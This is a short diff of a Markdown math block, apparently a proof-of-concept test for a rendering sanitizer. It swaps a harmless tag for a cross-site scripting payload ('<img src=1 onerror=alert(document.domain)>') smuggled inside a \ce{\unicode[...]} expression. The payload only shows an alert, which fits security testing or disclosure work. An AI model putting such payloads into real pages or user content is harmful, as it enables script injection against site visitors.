@@ -1,3 +1,3 @@
 ```math
-\ce{$&#x5C;unicode[<tag style="property:value" acceptedAttribute="True"></tag>;]{x0000}$}
+\ce{$&#x5C;unicode[41<img src=1 onerror=alert(document.domain)>;]{x0000}$}
 
